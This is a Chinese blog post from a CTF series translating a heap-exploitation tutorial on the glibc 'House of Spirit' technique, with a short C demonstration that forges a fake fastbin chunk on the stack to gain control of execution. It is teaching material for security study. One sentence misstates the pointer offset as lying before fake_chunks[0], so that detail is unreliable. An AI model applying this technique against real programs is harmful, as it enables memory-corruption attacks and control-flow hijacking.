---
title: Heap Exploitation系列翻译-13 House of Spirit
time: 2017-08-12
tags: [CTF, pwn, heap]
layout: post
categories: posts
---

# House of Spirit

> 本文是对Dhaval Kapil的[Heap Exploitation](https://heap-exploitation.dhavalkapil.com/)系列教程的译文

House of Spirit 跟其他攻击略有不同, 在某种意义上来说, 它涉及到攻击者在指针释放之前去覆写已有指针. 攻击者可以在内存(堆,栈等处)的任意地方创造一个'伪堆块'并覆写一个指针去指向该伪堆块, 堆块必须通过这种方式进行构造才能通过所有的安全测试. 这其实并不难而且也只涉及到设置`size`和next chunk的`size`. 当伪堆块被释放, 它就会被插入到合适的bin链中(最好是fastbin). 在之后的malloc申请大小跟伪堆块大小一致时便能返回攻击者的伪堆块. 最终结果类似于早先描述的'forging chunks attack'

考虑以下示例代码(下载完整版本: [这里](/files/heap-exploition/files/house_of_spirit.c)):

```c
struct fast_chunk {
  size_t prev_size;
  size_t size;
  struct fast_chunk *fd;
  struct fast_chunk *bk;
  char buf[0x20];                   // chunk falls in fastbin size range
};

struct fast_chunk fake_chunks[2];   // Two chunks in consecutive memory
// fake_chunks[0] at 0x7ffe220c5ca0
// fake_chunks[1] at 0x7ffe220c5ce0

void *ptr, *victim;

ptr = malloc(0x30);                 // First malloc

// Passes size check of "free(): invalid size"
fake_chunks[0].size = sizeof(struct fast_chunk);  // 0x40

// Passes "free(): invalid next size (fast)"
fake_chunks[1].size = sizeof(struct fast_chunk);  // 0x40

// Attacker overwrites a pointer that is about to be 'freed'
ptr = (void *)&fake_chunks[0].fd;

// fake_chunks[0] gets inserted into fastbin
free(ptr);

victim = malloc(0x30);              // 0x7ffe220c5cb0 address returned from malloc
```

注意, 跟预期一样, 返回的指针在`fake_chunks[0]`之前0x10即16字节处. 这是存储`fd`指针的地址. 这次攻击提供了更多可能的攻击. `victim`指向栈上的内存而非堆段. 通过修改栈上的返回地址, 攻击者可以控制程序的执行.
